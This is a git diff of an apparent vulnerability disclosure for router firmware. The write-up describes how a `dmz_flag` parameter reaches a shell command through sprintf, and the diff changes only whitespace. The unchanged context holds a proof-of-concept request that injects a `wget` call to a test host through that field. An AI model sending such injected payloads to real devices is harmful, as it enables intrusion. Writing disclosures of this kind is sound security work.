@@ -21,7 +21,7 @@ When the value of `firewall` is `DMZ`, the function sub_401880 will be called.
 
 <div  align="center"><img src="./img/ftext.png" style="zoom:80%;" /></div>
 
-the value of the `dmz_flag`  is inserted into `cat__etc_config_firewall_grep_redirect_wc__l_awk___printf_$1__`  using `sprintf`,and the value of `cat__etc_config_firewall_grep_redirect_wc__l_awk___printf_$1__` will be handled by the function sub_402AC0.
+the value of the `dmz_flag`  is inserted into `cat__etc_config_firewall_grep_redirect_wc__l_awk___printf_$1__`  using `sprintf`,and the value of `cat__etc_config_firewall_grep_redirect_wc__l_awk___printf_$1__ ` will be handled by the function sub_402AC0.
 
 <div  align="center"><img src="./img/sub_401880.png" style="zoom:80%;" /></div>
 
@@ -52,4 +52,5 @@ firewall=DMZ&DMZEnabled=0&dmz_flag=0;wget 192.168.6.1:6666/testpoc
 ```
 
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
 
